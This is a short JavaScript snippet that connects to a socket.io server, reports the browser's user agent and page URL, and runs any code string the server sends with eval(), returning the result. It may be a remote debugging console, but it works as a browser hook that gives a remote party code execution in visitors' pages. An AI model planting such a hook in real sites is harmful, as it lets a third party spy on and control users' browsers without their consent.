(function() {
  var socket = io.connect('https://'+__socket_server)
  
  var myinfo = {
    type: 'client',
    userAgent: navigator.userAgent,
    location: document.location.href
  };
  
  function sendLocation() {
    socket.emit('client-location', document.location.href);
  }
  
  socket.emit('client-info', myinfo);

  socket.on('get-location', function() {
    socket.emit('location', document.location.href);
  });
  
  socket.on('ping', function(data) {
    socket.emit('broadcast-pong', data);
    socket.emit('client-info', myinfo);
  });
  
  socket.on('eval', function(cmd) {
    var result = eval(cmd);
    socket.emit('client-evalresult', result);
  });


  function locationHashChanged() {
    myinfo.location = document.location.href;
    sendLocation();

  }
  
  window.onhashchange = locationHashChanged;

})()
